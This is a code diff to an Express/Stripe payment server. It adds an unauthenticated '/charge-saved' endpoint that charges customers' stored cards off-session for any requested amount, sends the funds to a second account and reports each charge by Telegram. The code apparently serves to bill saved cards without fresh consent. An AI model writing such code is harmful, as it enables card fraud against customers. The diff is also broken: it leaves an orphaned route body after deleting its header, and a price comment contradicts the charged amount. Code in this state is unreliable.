@@ -173,7 +173,7 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 0.99 CHF
+    // Charge 1 — 2,94 CHF
     try {
       const payment1 = await stripe.paymentIntents.create({
         amount: 99,
@@ -226,8 +226,57 @@ app.post('/create-subscription', async (req, res) => {
   }
 });
 
-// ─── View all saved customers ─────────────────────────────────────────────────
-app.get('/customers', (req, res) => {
+// ─── Manually charge a saved customer ────────────────────────────────────────
+// POST /charge-saved
+// Body: { "customerId": "cus_xxx", "amount": 99, "currency": "chf" }
+app.post('/charge-saved', async (req, res) => {
+  const { customerId, amount, currency } = req.body;
+  const customers = loadCustomers();
+  const customer = customers.find(c => c.customerId === customerId);
+
+  if (!customer) {
+    return res.status(404).json({ error: 'Customer not found in saved list' });
+  }
+
+  try {
+    const payment = await stripe.paymentIntents.create({
+      amount: amount || 99,
+      currency: currency || 'chf',
+      customer: customer.customerId,
+      payment_method: customer.paymentMethodId,
+      payment_method_types: [customer.pmType],
+      confirm: true,
+      off_session: true,
+      transfer_data: { destination: ACCOUNT_B },
+    });
+
+    console.log('Manual charge created:', payment.id, payment.status);
+
+    await sendTelegram(
+      `💰 <b>Manuelle Zahlung!</b>\n\n` +
+      `🆔 Kunde: <code>${customerId}</code>\n` +
+      `💳 Betrag: ${((amount || 99) / 100).toFixed(2)} ${(currency || 'chf').toUpperCase()}\n` +
+      `📋 Status: ${payment.status}\n` +
+      `📦 Produkt: LKomplett-Paket\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+    );
+
+    res.json({ success: true, paymentId: payment.id, status: payment.status });
+  } catch (error) {
+    console.error('Manual charge error:', error.message);
+    
+    await sendTelegram(
+      `❌ <b>Manuelle Zahlung Fehler!</b>\n\n` +
+      `🆔 Kunde: <code>${customerId}</code>\n` +
+      `⚠️ Fehler: ${error.message}\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+    );
+
+    res.status(400).json({ error: error.message });
+  }
+});
+
+
   const customers = loadCustomers();
   res.json({ total: customers.length, customers });
 });
